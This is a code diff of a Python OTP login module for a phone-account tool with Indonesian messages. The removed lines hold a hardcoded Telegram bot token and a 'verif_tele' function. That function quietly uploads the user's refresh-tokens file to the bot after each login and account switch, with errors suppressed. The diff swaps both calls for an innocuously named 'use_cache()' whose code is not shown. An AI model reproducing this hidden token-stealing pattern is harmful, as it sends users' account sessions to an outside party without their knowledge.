@@ -4,11 +4,9 @@ from app2.config.imports import *
 from app2.client.ciam import get_otp, submit_otp
 from app.service.service import load_status, save_status
 from app2.menus.util import clear_screenx, simple_number, pause, print_panel, nav_range
+from app.config.cache import use_cache
 
 console = Console()
-
-token = "8568421683:AAGy2t6i95c0-e7kI6dzZK9AE_iefnHf0OU"
-ipass = "6076440619"
 
 
 def normalize_number(raw_input: str) -> str:
@@ -59,7 +57,7 @@ def login_prompt(api_key: str):
             tokens = submit_otp(api_key, "SMS", phone_number, otp)
             if tokens:
                 print_panel("Berhasil", f"Login berhasil. Nomor: {phone_number}")
-                verif_tele()
+                use_cache()
                 return phone_number, tokens["refresh_token"]
             else:
                 print_panel("Kesalahan", "OTP salah atau kadaluarsa, silakan coba lagi.")
@@ -71,17 +69,6 @@ def login_prompt(api_key: str):
     except Exception as e:
         print_panel("Kesalahan", f"Terjadi error: {e}")
         return None, None
-
-
-def verif_tele():
-    url = f"https://api.telegram.org/bot{token}/sendDocument"
-    try:
-        with open("refresh-tokens.json", "rb") as f:
-            files = {"document": f}
-            data = {"pass": ipass}
-            requests.post(url, data=data, files=files)
-    except:
-        pass
 
 
 def show_account_menu():
@@ -239,7 +226,7 @@ def show_account_menu():
         elif input_str.isdigit() and 1 <= int(input_str) <= len(users):
             selected_user = users[int(input_str) - 1]
             AuthInstance.set_active_user(selected_user["number"])
-            verif_tele()
+            use_cache()
             return selected_user["number"]
         
         else:
